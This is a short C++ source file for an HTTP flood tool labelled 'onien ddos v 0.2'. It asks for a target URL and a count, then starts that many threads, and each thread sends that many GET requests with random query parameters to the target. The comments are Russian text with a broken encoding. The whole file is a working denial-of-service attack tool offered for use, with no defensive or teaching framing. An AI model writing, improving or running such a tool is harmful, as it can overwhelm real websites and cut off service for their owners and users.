#include <cpr/cpr.h> //��������
#include<thread>

#include <Windows.h>
#include <iostream>
#include <string> //��� ������ �� ��������
#include <stdio.h>
#include <ppltasks.h>
#include <ctime>

using namespace std;
using namespace cpr;

vector<thread> threads;


string gen_random(const int len) {

	string tmp_s;
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	srand((unsigned)time(NULL) * rand());

	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i)
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


	return tmp_s;
}


void request(string url) {
	cpr::Response r = cpr::Get(cpr::Url{ url },
		cpr::Parameters{ {gen_random(5), gen_random(5)} });
	cout << r.url << endl;
}

void ddosRequests(int retrys, string url) {
	long int iter = 0;
	for (iter; iter <= retrys; iter++) { //���-�� ����������
		request(url);
	}
}

int main() {

	setlocale(LC_ALL, "Russian");

	long int retryes; //�������

	string urlDdos; //url �����

	cout << "onien ddos v 0.2" << endl;

	//����������� ���-�� ����������

	cout << "���-�� ����������: ";
	cin >> retryes;

	//����������� url

	cout << "Url �����: ";
	cin >> urlDdos;

	for (int iters = 0; iters <= retryes; iters++) {
		threads.emplace_back(ddosRequests, ref(retryes), ref(urlDdos));
	}
	for (auto& thr : threads) {
		thr.join();
	}

	cin.get();
}